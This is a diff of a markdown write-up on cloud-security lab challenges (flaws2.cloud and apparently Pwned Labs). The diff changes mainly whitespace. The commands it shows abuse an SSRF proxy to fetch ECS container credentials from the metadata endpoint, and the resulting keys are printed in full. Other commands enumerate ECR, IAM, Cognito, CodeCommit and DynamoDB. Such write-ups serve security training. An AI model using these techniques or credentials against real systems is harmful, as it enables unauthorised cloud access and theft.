@@ -895,6 +895,7 @@ If an ECR is public, we can list its images. For that we need the repository nam
 }
 ```
 We can enumerate further by fetching the manifest of this container with
+
 ```
 ┌──(kali㉿kali)-[~]
 └─$ aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest | jq '.images[].imageManifest | fromjson'
@@ -920,8 +921,8 @@ We can enumerate further by fetching the manifest of this container with
     },
 <snip>
 ```
-We  can request a download URL for each layer with the following command. This required some trial and error until I found something useful
 
+We  can request a download URL for each layer with the following command. This required some trial and error until I found something useful
 ```
 ┌──(kali㉿kali)-[~]
 └─$ aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
@@ -931,6 +932,7 @@ We  can request a download URL for each layer with the following command. This r
     "layerDigest": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
 }
 ```
+
 Browsing to the URL will download the file which contains credentials
 
 <p align="center">
@@ -945,6 +947,7 @@ These creds work in the initial login form, and we find Level 3 at http://level3
 ```
 The container's webserver you got access to includes a simple proxy that can be access with: http://container.target.flaws2.cloud/proxy/http://flaws.cloud or http://container.target.flaws2.cloud/proxy/http://neverssl.com
 ```
+
 Once again this screams SSRF! AWS containers running on ECS usually have their credentials at `169.254.170.2/v2/credentials/GUID`, where GUID is a value disclosed in the environment variables. Using the proxy, we can exploit an LFI vulnerability
 ```
 ┌──(kali㉿kali)-[~]
@@ -957,12 +960,14 @@ Once again this screams SSRF! AWS containers running on ECS usually have their c
 └─$ cat out.txt                                                                               
 HOSTNAME=ip-172-31-47-179.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12cAWS_EXECUTION_ENV=AWS_ECS_FARGATEECS_AGENT_URI=http://169.254.170.2/api/cb2fb3252d31461abd9fcd33b7980cc5-3779599274AWS_DEFAULT_REGION=us-east-1ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/cb2fb3252d31461abd9fcd33b7980cc5-3779599274ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb2fb3252d31461abd9fcd33b7980cc5-3779599274PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_REGION=us-east-1PWD=/
 ```
+
 The important part is `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12c`, we can curl that with the proxy...
 ```
 ┌──(kali㉿kali)-[~]
 └─$ curl http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12c
 {"RoleArn":"arn:aws:iam::653711331788:role/level3","AccessKeyId":"ASIAZQNB3KHGPGUE3GXV","SecretAccessKey":"6LcdopLQNXKE2gLAXtiljUG3H9zZ1/C3AKmaspUt","Token":"IQoJb3JpZ2luX2VjELT//////////wEaCXVzLWVhc3QtMSJGMEQCIFqUoPnGlFEsLppoCGJeYTlwJHJ3kXZ9D4sdJGD8Y0EHAiBRK1oZ4P2LeH8TIWYO6tx/ixLJ/XmNhs88BQ6nIK2QiyrjAwhdEAMaDDY1MzcxMTMzMTc4OCIMV62/1us3tMbhL/mtKsADlYozTDyb5dHhKyIah3rXEeN+YBIDA7g9w29tYDwolOF+HDhN2gdvHzFBRMboz8XDcVcW75tjjB61600z77i87/5cWXxKqsdx/obAVcxmJSJBCMc9fQvVGBoM3VmYxDL0duIbSfDVGJKfIvX1BmSYccJizcZTR6Xn3nTrPBV4btT3TimJTK4YWjqthMUG9DgQ3lVZFxzY0aHDtzSyLahgD0kIyj41+vA7yan7OkL240CFl7AkWWCjSfUoybatFTwPbI5Qz15NPijQTTAoc/4HHE8bkuY3XAUiWYl1E/gxrfBd2EL+BqXDRQX9Cud6TnOFzFhCk75T1GcmvzXPo+xEtNaXDodXM0mr+Z8Mk2owLXt1bwxEttX9rQRwd0iVcKhq8S1ZhknlO4eGImGCAmnVxOFV+2BDikG26w7ZFfWuXqztgUH4RIfBEZBZoClUu79B3XLlTz0hEmsQHwxX8FzgO49D9yjoWHpSEHlzpowu4SR5rtQE4XaSxGs4NAd0qtSJH7a8R58USl2tckwQ/j2Pi4jkaeSnbeeNAElxeGXxH34xSFhlS/WRK8elP71XwDZN2I83fq7TPinCDzq6B8dq3jCl7rjHBjqmAbkJOU3X6u1HDEebQ/XT2yAxxxNzWF4QksKU9WFG7ffYsoOwVryeWJ0xjvB5y94IIEDgTG4RWf8Fe+PxLsOh9yB6JhzTP9JYYo4/fsCNuUc9YRZrS4HKOQ3YJ11XOPnRkmc+RtTz6PaEs3ug6rO2Y6ecJxT/DCq40GF/+Ta9aetpBHaAUx27kz8VSOJPAw25o2A1DjDrJ1HW7aU1ue1amurdBsySc8c=","Expiration":"2025-10-14T17:42:29Z"}
 ```
+
 Add them to the credentials file and test them
 ```
 ┌──(kali㉿kali)-[~]
@@ -1178,7 +1183,6 @@ Examining a role, note how it requires passing an External ID if the action sts:
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws iam get-role --role-name ExternalCostOpimizeAccess
-
 {
     "Role": {
         "Path": "/",
@@ -1384,7 +1388,7 @@ Another way of enumerating IAM permissions
 
 Enumerating EC2 launch templates. One interesting parameter is the user data script in base64
 ```
-──(kali㉿kali)-[~/Desktop]
+┌──(kali㉿kali)-[~/Desktop]
 └─$ aws ec2 describe-launch-templates                                                     
 {
     "LaunchTemplates": [
@@ -1672,7 +1676,6 @@ Sign up with the following command (extra points for user enumeration!)
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws cognito-idp sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username test --password 'Password123!' --profile pwnedlabs --region us-east-1
-
 An error occurred (UsernameExistsException) when calling the SignUp operation: User already exists
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Desktop]
@@ -1787,9 +1790,7 @@ Use the `Docker Scout` plugin for quick CVE analysis of the Docker image
     ✓ Indexed 88 packages
     ✗ Detected 17 vulnerable packages with a total of 83 vulnerabilities
 
-
 ## Overview
-
                     │                Analyzed Image                  
 ────────────────────┼────────────────────────────────────────────────
   Target            │  hljose/huge-logistics-terraform-runner:0.12   
@@ -1801,7 +1802,6 @@ Use the `Docker Scout` plugin for quick CVE analysis of the Docker image
 
 
 ## Packages and Vulnerabilities
-
    2C     4H     9M     4L  curl 8.2.0-r0
 pkg:apk/alpine/curl@8.2.0-r0?os_name=alpine&os_version=3.18
 
@@ -1858,11 +1858,8 @@ Enumerating CodeCommit
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws-enumerator dump -services codecommit                        
-
 ----------------------------- CODECOMMIT -----------------------------
-
 ListRepositories
-
                                                                                                                                                                                                                                            
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws codecommit list-repositories                                
@@ -1898,7 +1895,6 @@ Specific repository enumeration... The `fileContent` variable is base64-encoded.
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws codecommit list-branches --repository-name vessel-tracking
-
 {
     "branches": [
         "master",
@@ -1917,7 +1913,6 @@ Specific repository enumeration... The `fileContent` variable is base64-encoded.
                                                                                                                                                                                                                                            
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws codecommit get-commit --repository-name vessel-tracking --commit-id b63f0756ce162a3928c4470681cf18dd2e4e2d5a
-
 {
     "commit": {
         "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a",
@@ -1987,7 +1982,6 @@ Enumerating DynamoDB
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws dynamodb describe-table --table-name user_order_logs
-
 An error occurred (AccessDeniedException) when calling the DescribeTable operation: User: arn:aws:iam::243687662613:user/migration-test is not authorized to perform: dynamodb:DescribeTable on resource: arn:aws:dynamodb:us-east-1:243687662613:table/user_order_logs because no identity-based policy allows the dynamodb:DescribeTable action
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Desktop]
